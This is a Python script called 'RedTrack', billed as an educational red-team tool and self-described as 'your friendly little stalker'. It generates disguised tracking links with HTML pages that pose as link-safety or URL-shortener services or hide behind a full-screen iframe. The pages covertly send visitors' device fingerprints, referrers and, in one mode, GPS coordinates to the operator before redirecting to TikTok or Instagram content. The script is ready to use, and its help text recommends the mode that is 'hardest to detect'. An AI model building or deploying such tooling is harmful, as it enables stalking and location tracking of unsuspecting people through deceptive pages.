#!/usr/bin/env python3
"""
RedTrack - Link Tracker Framework v2.1
Educational Red Team Training Tool
"""

import argparse
import hashlib
import json
import random
import string
import sys
from datetime import datetime
from urllib.parse import urlencode

# ANSI Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

class LinkTracker:
    def __init__(self, domain="https://training.internal"):
        self.domain = domain
        self.campaigns = {}
        
    def _gen_id(self, campaign):
        """Generate tracking ID"""
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        raw = f"{campaign}_{datetime.now().isoformat()}_{rand}"
        return hashlib.sha256(raw.encode()).hexdigest()[:12]
    
    def basic_mode(self, url, campaign):
        """Basic tracking - Simple redirect"""
        tid = self._gen_id(campaign)
        params = {'t': tid, 'r': url}
        track_url = f"{self.domain}/r?{urlencode(params)}"
        
        self.campaigns[tid] = {
            'mode': 'basic',
            'url': url,
            'created': datetime.now().isoformat()
        }
        
        return {
            'url': track_url,
            'id': tid,
            'html': self._basic_html(url, tid)
        }
    
    def advanced_mode(self, url, campaign):
        """Advanced tracking - Device fingerprinting + geolocation"""
        tid = self._gen_id(campaign)
        short = tid[:6]
        track_url = f"{self.domain}/s/{short}"
        
        self.campaigns[tid] = {
            'mode': 'advanced',
            'url': url,
            'created': datetime.now().isoformat()
        }
        
        return {
            'url': track_url,
            'id': tid,
            'html': self._advanced_html(url, tid)
        }
    
    def stealth_mode(self, url, campaign):
        """Stealth tracking - Mimics legitimate services"""
        tid = self._gen_id(campaign)
        # Disguise as URL shortener
        track_url = f"{self.domain}/l/{tid[:8]}"
        
        self.campaigns[tid] = {
            'mode': 'stealth',
            'url': url,
            'created': datetime.now().isoformat()
        }
        
        return {
            'url': track_url,
            'id': tid,
            'html': self._stealth_html(url, tid)
        }
    
    def ghost_mode(self, url, campaign):
        """Ghost mode - Zero footprint, iframe injection"""
        tid = self._gen_id(campaign)
        track_url = f"{self.domain}/v/{tid[:7]}"
        
        self.campaigns[tid] = {
            'mode': 'ghost',
            'url': url,
            'created': datetime.now().isoformat()
        }
        
        return {
            'url': track_url,
            'id': tid,
            'html': self._ghost_html(url, tid)
        }
    
    def _basic_html(self, url, tid):
        return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="0;url={url}">
<title>Redirecting...</title>
</head><body>
<script>
fetch('/track/{tid}?d='+btoa(navigator.userAgent));
location.href="{url}";
</script>
</body></html>"""
    
    def _advanced_html(self, url, tid):
        return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta property="og:title" content="Check this out">
<meta property="og:type" content="website">
<meta property="og:url" content="{self.domain}/s/{tid[:6]}">
<title>Loading...</title>
</head><body>
<script>
const d={{
u:navigator.userAgent,
l:navigator.language,
s:screen.width+'x'+screen.height,
t:new Date().toISOString(),
r:document.referrer
}};
navigator.geolocation.getCurrentPosition(
p=>{{
d.lat=p.coords.latitude;
d.lon=p.coords.longitude;
fetch('/api/t/{tid}',{{method:'POST',body:JSON.stringify(d)}});
}},
()=>fetch('/api/t/{tid}',{{method:'POST',body:JSON.stringify(d)}})
);
setTimeout(()=>location.href="{url}",150);
</script>
<p>Loading content...</p>
</body></html>"""
    
    def _stealth_html(self, url, tid):
        return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta property="og:title" content="Shared Content">
<meta property="og:image" content="{self.domain}/preview.jpg">
<title>Opening...</title>
<style>body{{font-family:Arial;text-align:center;padding:50px}}</style>
</head><body>
<h2>🔗 Secure Link Service</h2>
<p>Verifying link safety...</p>
<script>
const i=new Image();
i.src='/px/{tid}?d='+btoa(navigator.userAgent)+'&t='+Date.now();
setTimeout(()=>{{
const a=document.createElement('a');
a.href="{url}";
a.click();
}},200);
</script>
</body></html>"""
    
    def _ghost_html(self, url, tid):
        return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta property="og:title" content="Media Content">
<title>Content</title>
</head><body style="margin:0;padding:0">
<script>
(()=>{{
const b=btoa(JSON.stringify({{
u:navigator.userAgent,
p:navigator.platform,
l:navigator.language,
m:navigator.maxTouchPoints>0
}}));
new Image().src='/i/{tid}.gif?d='+b;
const f=document.createElement('iframe');
f.src="{url}";
f.style="position:fixed;top:0;left:0;width:100%;height:100%;border:none";
document.body.appendChild(f);
}})();
</script>
</body></html>"""
    
    def get_report(self, tid):
        return self.campaigns.get(tid, {'error': 'Not found'})
    
    def export(self, filename='campaigns.json'):
        with open(filename, 'w') as f:
            json.dump(self.campaigns, f, indent=2)
        return filename

def banner():
    print(f"""{RED}{BOLD}
    ██████╗ ███████╗██████╗        ██████╗██████╗  ██████╗ ███████╗███████╗
    ██╔══██╗██╔════╝██╔══██╗      ██╔════╝██╔══██╗██╔═══██╗██╔════╝██╔════╝
    ██████╔╝█████╗  ██║  ██║█████╗██║     ██████╔╝██║   ██║███████╗███████╗
    ██╔══██╗██╔══╝  ██║  ██║╚════╝██║     ██╔══██╗██║   ██║╚════██║╚════██║
    ██║  ██║███████╗██████╔╝      ╚██████╗██║  ██║╚██████╔╝███████║███████║
    ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝{RESET}
                                                                       
    {RED}                |            v2.1{RESET}
    {RED}             ---|---     {RESET}     {YELLOW}your friendly little stalker {RESET}
    {RED}        ─────┤  +  ├─────{RESET}
    {RED}             ---|---{RESET}
    {RED}                |{RESET}
""")


def print_help():
    print(f"""{BOLD}USAGE:{RESET}
  python3 {sys.argv[0]} [OPTIONS]

{BOLD}MODES:{RESET}
  {GREEN}-b, --basic{RESET}      Basic tracking mode (simple redirect)
  {YELLOW}-a, --advanced{RESET}   Advanced mode (fingerprinting + geo)
  {MAGENTA}-s, --stealth{RESET}    Stealth mode (mimics URL shortener)
  {RED}-g, --ghost{RESET}      Ghost mode (zero footprint, iframe)

{BOLD}OPTIONS:{RESET}
  -u, --url        Target URL (TikTok/Instagram)
  -c, --campaign   Campaign name
  -d, --domain     Custom domain (default: training.internal)
  -o, --output     Save HTML to file
  -l, --list       List all campaigns
  -r, --report     Show campaign report (requires -i)
  -i, --id         Campaign ID
  -e, --export     Export campaigns to JSON

{BOLD}EXAMPLES:{RESET}
  {CYAN}# Basic mode{RESET}
  python3 {sys.argv[0]} -b -u https://tiktok.com/@user/video/123 -c test1

  {CYAN}# Advanced mode with output{RESET}
  python3 {sys.argv[0]} -a -u https://instagram.com/reel/ABC -c test2 -o page.html

  {CYAN}# Stealth mode{RESET}
  python3 {sys.argv[0]} -s -u https://tiktok.com/@user/video/456 -c test3

  {CYAN}# Ghost mode (hardest to detect){RESET}
  python3 {sys.argv[0]} -g -u https://instagram.com/reel/XYZ -c test4
  
  {CYAN}# Show campaign report{RESET}
  python3 {sys.argv[0]} -r -i abc123def456
""")

def interactive_mode():
    banner()
    print(f"{BOLD}Select Attack Mode:{RESET}\n")
    print(f"  {GREEN}[1]{RESET} Basic      - Simple redirect tracking")
    print(f"  {YELLOW}[2]{RESET} Advanced   - Device fingerprint + geolocation")
    print(f"  {MAGENTA}[3]{RESET} Stealth    - Mimics legitimate URL shortener")
    print(f"  {RED}[4]{RESET} Ghost      - Zero footprint iframe injection")
    print(f"  {BLUE}[5]{RESET} List       - Show all campaigns")
    print(f"  {CYAN}[0]{RESET} Exit\n")
    
    choice = input(f"{BOLD}redtrack>{RESET} ").strip()
    
    if choice == '0':
        print(f"{YELLOW}Exiting...{RESET}")
        sys.exit(0)
    
    if choice == '5':
        tracker = LinkTracker()
        if not tracker.campaigns:
            print(f"{YELLOW}No campaigns found{RESET}")
        else:
            print(f"\n{BOLD}Campaigns:{RESET}")
            for tid, data in tracker.campaigns.items():
                print(f"  {GREEN}{tid}{RESET} - {data['mode']} - {data['url'][:50]}")
        print()
        return interactive_mode()
    
    if choice not in ['1', '2', '3', '4']:
        print(f"{RED}Invalid choice{RESET}")
        return interactive_mode()
    
    url = input(f"{BOLD}Target URL:{RESET} ").strip()
    campaign = input(f"{BOLD}Campaign name:{RESET} ").strip()
    
    if not url or not campaign:
        print(f"{RED}URL and campaign required{RESET}")
        return interactive_mode()
    
    tracker = LinkTracker()
    mode_map = {
        '1': ('basic', tracker.basic_mode),
        '2': ('advanced', tracker.advanced_mode),
        '3': ('stealth', tracker.stealth_mode),
        '4': ('ghost', tracker.ghost_mode)
    }
    
    mode_name, mode_func = mode_map[choice]
    result = mode_func(url, campaign)
    
    print(f"\n{GREEN}✓{RESET} {BOLD}Link generated:{RESET}")
    print(f"  {CYAN}Mode:{RESET}       {mode_name}")
    print(f"  {CYAN}URL:{RESET}        {result['url']}")
    print(f"  {CYAN}Tracking ID:{RESET} {result['id']}")
    
    save = input(f"\n{BOLD}Save HTML? (y/n):{RESET} ").strip().lower()
    if save == 'y':
        filename = f"{result['id']}.html"
        with open(filename, 'w') as f:
            f.write(result['html'])
        print(f"{GREEN}✓{RESET} Saved to {filename}")
    
    print()
    cont = input(f"{BOLD}Continue? (y/n):{RESET} ").strip().lower()
    if cont == 'y':
        return interactive_mode()

def main():
    if len(sys.argv) == 1:
        interactive_mode()
        return
    
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-h', '--help', action='store_true')
    parser.add_argument('-b', '--basic', action='store_true')
    parser.add_argument('-a', '--advanced', action='store_true')
    parser.add_argument('-s', '--stealth', action='store_true')
    parser.add_argument('-g', '--ghost', action='store_true')
    parser.add_argument('-u', '--url')
    parser.add_argument('-c', '--campaign')
    parser.add_argument('-d', '--domain', default='https://training.internal')
    parser.add_argument('-o', '--output')
    parser.add_argument('-l', '--list', action='store_true')
    parser.add_argument('-r', '--report', action='store_true')
    parser.add_argument('-i', '--id')
    parser.add_argument('-e', '--export', action='store_true')
    
    args = parser.parse_args()
    
    if args.help:
        print_help()
        return
    
    tracker = LinkTracker(args.domain)
    
    if args.list:
        banner()
        if not tracker.campaigns:
            print(f"{YELLOW}No campaigns found{RESET}")
        else:
            for tid, data in tracker.campaigns.items():
                print(f"{GREEN}{tid}{RESET} - {data['mode']} - {data['url']}")
        return
    
    if args.report:
        if not args.id:
            print(f"{RED}Error: -i required for report{RESET}")
            return
        banner()
        report = tracker.get_report(args.id)
        print(json.dumps(report, indent=2))
        return
    
    if args.export:
        banner()
        filename = tracker.export()
        print(f"{GREEN}✓{RESET} Exported to {filename}")
        return
    
    # Mode selection
    if not any([args.basic, args.advanced, args.stealth, args.ghost]):
        print(f"{RED}Error: Select a mode (-b/-a/-s/-g){RESET}")
        print(f"Run with -h for help")
        return
    
    if not args.url or not args.campaign:
        print(f"{RED}Error: -u and -c required{RESET}")
        return
    
    banner()
    
    if args.basic:
        result = tracker.basic_mode(args.url, args.campaign)
        mode = "Basic"
    elif args.advanced:
        result = tracker.advanced_mode(args.url, args.campaign)
        mode = "Advanced"
    elif args.stealth:
        result = tracker.stealth_mode(args.url, args.campaign)
        mode = "Stealth"
    else:
        result = tracker.ghost_mode(args.url, args.campaign)
        mode = "Ghost"
    
    print(f"{GREEN}✓{RESET} {BOLD}{mode} link generated:{RESET}")
    print(f"  {CYAN}URL:{RESET}        {result['url']}")
    print(f"  {CYAN}Tracking ID:{RESET} {result['id']}")
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(result['html'])
        print(f"  {CYAN}HTML saved:{RESET}  {args.output}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Interrupted{RESET}")
        sys.exit(0)